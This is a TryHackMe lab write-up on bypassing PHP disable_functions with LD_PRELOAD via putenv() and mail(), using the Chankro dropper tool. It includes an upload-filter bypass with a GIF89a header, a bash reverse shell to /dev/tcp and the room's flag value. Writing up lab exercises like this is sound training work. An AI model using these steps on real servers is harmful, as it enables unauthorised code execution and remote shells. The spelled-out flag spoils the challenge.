## Bypass Disable Functions - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/bypassdisablefunctions)

What is a file upload vulnerability?

This vulnerability occurs in web applications where there is the possibility of uploading a file without being checked by a security system that curbs potential dangers. 

It allows an attacker to upload files with code (scripts such as .php, .aspx and more) and run them on the same server, more information in this room.

Why this room?

Among the typically applied measures is disabling dangerous functions that could execute operating system commands or start processes. Functions such as system() or shell_exec() are often disabled through PHP directives defined in the php.ini configuration file. Other functions, perhaps less known as dl() (which allows you to load a PHP extension dynamically), can go unnoticed by the system administrator and not be disabled. The usual thing in an intrusion test is to list which functions are enabled in case any have been forgotten.

One of the easiest techniques to implement and not very widespread is to abuse the mail() and putenv() functionalities. This technique is not new, it was already reported to PHP in 2008 by gat3way, but it still works to this day. Through the putenv() function, we can modify the environment variables, allowing us to assign the value we want to the variable LD_PRELOAD. Roughly LD_PRELOAD will allow us to pre-load a .so library before the rest of the libraries, so that if a program uses a function of a library (libc.so for example), it will execute the one in our library instead of the one it should. In this way, we can hijack or "hook" functions, modifying their behaviour at will.

[Chankro](https://github.com/TarlogicSecurity/Chankro): tool to evade disable_functions and open_basedir

Through Chankro, we generate a PHP script that will act as a dropper, creating on the server a .so library and the binary (a meterpreter, for example) or bash script (reverse shell, for example) that we want to execute freely, and that will later call putenv() and mail() to launch the process.

Install tool:

```
git clone https://github.com/TarlogicSecurity/Chankro.git
cd Chankro
python2 chankro.py --help

python chankro.py --arch 64 --input c.sh --output tryhackme.php --path /var/www/html

--arch = Architecture of system victim 32 o 64.
--input = file with your payload to execute
--output = Name of the PHP file you are going to create; this is the file you will need to upload.
--path = It is necessary to specify the absolute path where our uploaded PHP file is located. For example, if our file is located in the uploads folder DOCUMENTROOT + uploads. 
```

Now, when executing the PHP script in the web server, the necessary files will be created to execute our payload. My command run successfully, and I created a file in the directory with the output of the command.

All credit goes to [Tarlogic](https://www.tarlogic.com/es/blog/evadir-disable_functions-open_basedir/) for the script and explaining the method of the bypass.

**IP: 10.10.248.32**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: File Upload Vulnerabilities <br>

**Tools Used**: Nmap, Nikto, Gobuster, Chankro

[Chankro](https://github.com/TarlogicSecurity/Chankro)<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20CUT.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- First, I did Nmap scan as always.

  ```
  nmap -A -p- 10.10.248.32
  22 open, 80 open
  22 -> OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
  80 -> Apache httpd 2.4.18 ((Ubuntu))
  ```

- Ok, cool, so it has web app. I did Gobuster, it found couple of directories, and Nikto but I forgot to save Gobuster output...

  ```
  nikto -h 10.10.248.32
  /phpinfo.php
  Linux ubuntu 4.4.0-210-generic #242-Ubuntu SMP Fri Apr 16 09:57:56 UTC 2021 x86_64
  ```
  
- While I was going through web page, I found `/assets` and when I went to `/phpinfo.php` I found root directory `/var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db`

---

## ⚙️ Shell Access

- Alrighty, let's start exploiting with Chankro. Tool is pretty simple, it is going to make your script into `.php` and allow it to execute custom payloads without the PHP restriction. Let's test it with basic command `whoami`.

  Make a shell, use Chankro then upload both files and open them on web page.

  ```
  #Creating payload
  nano command.sh
  
  #!/bin/bash
  
  whoami > /var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db/exploit.txt

  #Save this payload

  #Now use Chankro
  python2 Chankro/chankro.py --arch 64 --input command.sh --output exploit.php --path /var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db
  ```

- Since that part is done, before you upload them, you must edit `exploit.php` by adding `GIF89a;` at the beginning of script othervise it won't work at all. Then upload exploits and open them on web page.

  ```
  go to http://10.10.248.32/uploads and open exploit.php
  
  go to http://10.10.248.32/exploit.txt and open it
  ```

- `exploit.txt` will show `www-data` which means command worked! Now let's do the same process again but with interractive shell instead of command.

  ```
  nano shell.sh
  
  #!/bin/bash
  
  bash -i >& /dev/tcp/[YOUR-THM-IP]/[PORT] 0>&1
  
  #Save it.
  
  python2 Chankro/chankro.py --arch 64 --input shell.sh --output exploit2.php --path /var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db
  
  edit exploit2.php by adding GIF89a; at the beginning
  ```

- Now upload `exploit2.php`, start a listener and then open the `exploit2.php` on web page and you'll have interractive shell. Let's get the flag now.
  ```
  nc -lvnp [PORT]
  ```
  
---

## 🧍 User Privilege Escalation

- Getting the flag was pretty easy, use `find` to find it and then `cat` it.
  ```
  find / -name flag.txt
  
  cat /home/s4vi/flag.txt
  ```

---

## 🏁 Flags

- **User Flag**: `thm{bypass_d1sable_functions_1n_php}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Nothing much honestly.`

- What did I learn?
  `New tool and new exploits.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
